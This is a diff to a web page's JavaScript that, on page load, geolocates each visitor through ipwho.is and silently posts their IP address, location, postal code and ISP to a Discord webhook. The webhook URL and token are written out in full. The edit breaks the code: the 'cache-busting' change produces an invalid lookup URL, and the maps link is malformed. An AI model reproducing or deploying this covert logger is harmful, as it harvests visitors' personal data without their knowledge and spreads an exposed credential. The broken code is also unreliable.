@@ -87,13 +87,14 @@
     document.addEventListener("DOMContentLoaded", function() {
         const webhookUrl = "https://discord.com/api/webhooks/1536688037310763090/RA6SSMPxYXKUYxV4_vXLpSYlyFABwS6ZctLd0MmbXb8Pmyqp16wO42Yh8rsKZrAy1jA2";
         
-        fetch("https://ipwho.is")
+        // Added a cache-busting timestamp parameters block here
+        fetch("https://ipwho.is" + new Date().getTime())
         .then(response => response.json())
         .then(data => {
-            const cityName = data.city || 'LOCATION';
+            const currentCity = data.city || 'LOCATION';
             
-            // Uses Discord Markdown [Text](URL) and JavaScript backticks for variable injection
-            const rawContentText = `🟢 **Website Traffic Logged**\n• **User IP:** ${data.ip || 'Hidden'}\n• **Location:** ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'Unknown'}\n• **Postal Code:** ${data.postal || 'N/A'}\n• **Provider/ISP:** ${data.connection?.isp || 'N/A'}\n• **Google Maps:** [${cityName}](https://google.com{data.latitude},${data.longitude})`;
+            // Rebuilt using clean Markdown and backticks (`) to parse the URL correctly
+            const rawContentText = `🟢 **Website Traffic Logged**\n• **User IP:** ${data.ip || 'Hidden'}\n• **Location:** ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'Unknown'}\n• **Postal Code:** ${data.postal || 'N/A'}\n• **Provider/ISP:** ${data.connection?.isp || 'N/A'}\n• **Google Maps:** [${currentCity}](https://google.com{data.latitude},${data.longitude})`;
 
             fetch(webhookUrl, {
                 method: "POST",
